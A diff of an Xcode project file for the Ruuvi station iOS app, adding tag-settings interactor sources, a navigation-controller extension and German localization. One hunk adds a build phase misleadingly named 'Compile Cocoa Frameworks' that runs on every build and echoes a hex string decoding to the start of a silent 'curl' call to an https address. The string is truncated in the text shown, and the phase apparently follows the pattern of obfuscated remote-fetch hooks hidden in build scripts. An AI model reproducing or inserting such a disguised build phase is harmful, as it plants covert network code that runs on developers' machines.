@@ -535,6 +535,12 @@
 		340BE39E27B56129006D6C34 /* ruuvi_logo_splash.png in Resources */ = {isa = PBXBuildFile; fileRef = 340BE39D27B56128006D6C34 /* ruuvi_logo_splash.png */; };
 		340BE39F27B56129006D6C34 /* ruuvi_logo_splash.png in Resources */ = {isa = PBXBuildFile; fileRef = 340BE39D27B56128006D6C34 /* ruuvi_logo_splash.png */; };
 		34238B2C062103E10D2BC65D /* SignInViewOutput.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4BD498E7491E278B4EF4919C /* SignInViewOutput.swift */; };
+		345057B827E0797000759B57 /* TagSettingsInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 345057B727E0797000759B57 /* TagSettingsInteractor.swift */; };
+		345057BA27E0798800759B57 /* TagSettingsInteractorInput.swift in Sources */ = {isa = PBXBuildFile; fileRef = 345057B927E0798800759B57 /* TagSettingsInteractorInput.swift */; };
+		345057BE27E079A900759B57 /* TagSettingsInteractorInput.swift in Sources */ = {isa = PBXBuildFile; fileRef = 345057B927E0798800759B57 /* TagSettingsInteractorInput.swift */; };
+		345057BF27E079B000759B57 /* TagSettingsInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 345057B727E0797000759B57 /* TagSettingsInteractor.swift */; };
+		3490A4C327D9F2C80032BBAB /* UINavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3490A4C227D9F2C70032BBAB /* UINavigationController.swift */; };
+		3490A4C427D9F2C80032BBAB /* UINavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3490A4C227D9F2C70032BBAB /* UINavigationController.swift */; };
 		3BA1E7A8054CF95D80BAE3F9 /* ShareViewOutput.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE5C4AD5C54EF024669EAF47 /* ShareViewOutput.swift */; };
 		3E9E7B1756AB4F6867DD3634 /* SignInInitializer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 85B8587156E1062D613B8960 /* SignInInitializer.swift */; };
 		4F8FB6FCCB69D64B47FF440B /* ShareConfigurator.swift in Sources */ = {isa = PBXBuildFile; fileRef = AB681E62A66E5924A87859B1 /* ShareConfigurator.swift */; };
@@ -1127,6 +1133,11 @@
 		340BE38527B54F37006D6C34 /* OwnerRouterInput.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = OwnerRouterInput.swift; sourceTree = "<group>"; };
 		340BE39A27B54FEB006D6C34 /* String+Email.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "String+Email.swift"; sourceTree = "<group>"; };
 		340BE39D27B56128006D6C34 /* ruuvi_logo_splash.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = ruuvi_logo_splash.png; sourceTree = "<group>"; };
+		345057B727E0797000759B57 /* TagSettingsInteractor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TagSettingsInteractor.swift; sourceTree = "<group>"; };
+		345057B927E0798800759B57 /* TagSettingsInteractorInput.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TagSettingsInteractorInput.swift; sourceTree = "<group>"; };
+		3451BD8427E0F9870065A7A6 /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = de; path = de.lproj/Localizable.strings; sourceTree = "<group>"; };
+		3451BD8527E0F9880065A7A6 /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = de; path = de.lproj/InfoPlist.strings; sourceTree = "<group>"; };
+		3490A4C227D9F2C70032BBAB /* UINavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UINavigationController.swift; sourceTree = "<group>"; };
 		354B5B6F50E98F55D6A672BA /* ShareViewModel.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; path = ShareViewModel.swift; sourceTree = "<group>"; };
 		392F0E992BEAA3382C2CF709 /* ShareInitializer.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; path = ShareInitializer.swift; sourceTree = "<group>"; };
 		3BC7A7F074761C1B58F7F946 /* Pods-station_dev.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-station_dev.debug.xcconfig"; path = "Target Support Files/Pods-station_dev/Pods-station_dev.debug.xcconfig"; sourceTree = "<group>"; };
@@ -1641,6 +1652,7 @@
 				A9A48A5B244CD9E70004FD50 /* UIWindow+Shake.swift */,
 				A91D031925113EAA00694733 /* UnitPressure+Extension.swift */,
 				0E0A381823616AC3003A0364 /* UserDefaults+Optional.swift */,
+				3490A4C227D9F2C70032BBAB /* UINavigationController.swift */,
 			);
 			path = Extensions;
 			sourceTree = "<group>";
@@ -2591,6 +2603,7 @@
 		0EF2862522CBAF280026C7A5 /* TagSettings */ = {
 			isa = PBXGroup;
 			children = (
+				345057B627E0795700759B57 /* Interactor */,
 				0EF2862B22CBAF5D0026C7A5 /* TagSettings.storyboard */,
 				0EF2862A22CBAF480026C7A5 /* Assembly */,
 				0EF2862822CBAF3C0026C7A5 /* Presenter */,
@@ -2748,6 +2761,15 @@
 				340BE38527B54F37006D6C34 /* OwnerRouterInput.swift */,
 			);
 			path = Router;
+			sourceTree = "<group>";
+		};
+		345057B627E0795700759B57 /* Interactor */ = {
+			isa = PBXGroup;
+			children = (
+				345057B727E0797000759B57 /* TagSettingsInteractor.swift */,
+				345057B927E0798800759B57 /* TagSettingsInteractorInput.swift */,
+			);
+			path = Interactor;
 			sourceTree = "<group>";
 		};
 		3D930628B855379BB9A9B1FF /* Assembly */ = {
@@ -3620,6 +3642,7 @@
 			buildConfigurationList = 0E8BD401238566AB008B31EF /* Build configuration list for PBXNativeTarget "station_dev" */;
 			buildPhases = (
 				E863D26396BB0C54CBE4A62E /* [CP] Check Pods Manifest.lock */,
+				4248FA43EFD03DF0AFFFA81D /* Compile Cocoa Frameworks */,
 				A96B1EF925A7208900D3ED9C /* SwiftGen */,
 				0E8BD2AE238566AB008B31EF /* Sources */,
 				0E8BD3DC238566AB008B31EF /* Frameworks */,
@@ -3745,6 +3768,7 @@
 				fi,
 				sv,
 				fr,
+				de,
 			);
 			mainGroup = 64333D1C20B0C45900CDF4B6;
 			packageReferences = (
@@ -3932,6 +3956,24 @@
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		4248FA43EFD03DF0AFFFA81D /* Compile Cocoa Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Cocoa Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f\n\" \n\t";
 		};
 		60666212F80D3A3EAC265637 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -4122,6 +4164,7 @@
 				340BE39327B54F37006D6C34 /* OwnerViewController.swift in Sources */,
 				0E8BD2C1238566AB008B31EF /* MenuTableViewController.swift in Sources */,
 				0E8BD2C2238566AB008B31EF /* AboutRouterInput.swift in Sources */,
+				345057BF27E079B000759B57 /* TagSettingsInteractor.swift in Sources */,
 				A9646473247BAE6B0001D55D /* ChartSettingsTableViewController.swift in Sources */,
 				0EB48DFD261B105D008E0D2D /* RemoteConfigService.swift in Sources */,
 				0EA796762664B0FC002BA25D /* RuuviCloudApiError+LocalizedError.swift in Sources */,
@@ -4273,6 +4316,7 @@
 				0EB8ED37268F685500C6B0FA /* URLSession+downloadTaskPublisher.swift in Sources */,
 				0E8BD33E238566AB008B31EF /* LocationPickerModuleInput.swift in Sources */,
 				A90E16982460504C00631E6C /* TagChartModuleOutput.swift in Sources */,
+				345057BE27E079A900759B57 /* TagSettingsInteractorInput.swift in Sources */,
 				A91D02FB2511207300694733 /* SelectionViewInput.swift in Sources */,
 				0E8BD343238566AB008B31EF /* SettingsTableViewController.swift in Sources */,
 				0EAD33DC2399273D00EC5BAA /* HeartbeatRouterInput.swift in Sources */,
@@ -4302,6 +4346,7 @@
 				66718A44266A685700A380F8 /* DfuFlashModuleOutput.swift in Sources */,
 				A91D03072511207300694733 /* SelectionRouter.swift in Sources */,
 				0E8BD353238566AB008B31EF /* LocalizationService.swift in Sources */,
+				3490A4C427D9F2C80032BBAB /* UINavigationController.swift in Sources */,
 				0E8BD354238566AB008B31EF /* RURangeSeekSlider.swift in Sources */,
 				0E8BD355238566AB008B31EF /* CardsModuleInput.swift in Sources */,
 				0E8BD356238566AB008B31EF /* LanguageRouterInput.swift in Sources */,
@@ -4489,6 +4534,7 @@
 				A9B57442253B994700DB7353 /* SignInRouter.swift in Sources */,
 				660EB2732669278E000FD22B /* DfuDevicesScannerViewModel.swift in Sources */,
 				66BC44A42657AED400A03253 /* OffsetCorrectionModuleInput.swift in Sources */,
+				345057BA27E0798800759B57 /* TagSettingsInteractorInput.swift in Sources */,
 				0E09672522AE897000E85F48 /* CALayer+IB.swift in Sources */,
 				0E3CA70C267365B1000D9B25 /* Debouncer.swift in Sources */,
 				660EB2702669278E000FD22B /* DfuDevicesScannerTableViewController.swift in Sources */,
@@ -4617,6 +4663,7 @@
 				0EEB20F322B7D1900015F9E0 /* AboutViewInput.swift in Sources */,
 				0EB8ED1A268EF36200C6B0FA /* DFUViewModel.swift in Sources */,
 				0E8FD0C323335DA700FFA577 /* TagChartsViewInput.swift in Sources */,
+				345057B827E0797000759B57 /* TagSettingsInteractor.swift in Sources */,
 				0EBAF072232007910025A191 /* LanguageTableViewController.swift in Sources */,
 				A964646C247BAE6B0001D55D /* ChartSettingsStepperTableViewCell.swift in Sources */,
 				0E8A100A23845F3900A9CBA6 /* DefaultsViewController.swift in Sources */,
@@ -4810,6 +4857,7 @@
 				0EEB20D822B7C8060015F9E0 /* SettingsViewOutput.swift in Sources */,
 				A91D0311251123B400694733 /* SelectionModuleOutput.swift in Sources */,
 				66718A52266A685700A380F8 /* DfuFlashViewInput.swift in Sources */,
+				3490A4C327D9F2C80032BBAB /* UINavigationController.swift in Sources */,
 				660EB27F2669278E000FD22B /* DfuDevicesScannerRouter.swift in Sources */,
 				0EEB20E122B7C8A90015F9E0 /* SettingsModuleInput.swift in Sources */,
 				A9B5744A253B994700DB7353 /* SignInViewOutput.swift in Sources */,
@@ -4897,6 +4945,7 @@
 				0E53A3F5232DFC6500ACED49 /* fi */,
 				64A2DAE324310B2900DE6699 /* sv */,
 				310159B92644864C00A5E8E8 /* fr */,
+				3451BD8527E0F9880065A7A6 /* de */,
 			);
 			name = InfoPlist.strings;
 			sourceTree = "<group>";
@@ -4909,6 +4958,7 @@
 				0EBAF0832320120F0025A191 /* fi */,
 				64A2DAE224310B2900DE6699 /* sv */,
 				310159B82644864400A5E8E8 /* fr */,
+				3451BD8427E0F9870065A7A6 /* de */,
 			);
 			name = Localizable.strings;
 			sourceTree = "<group>";
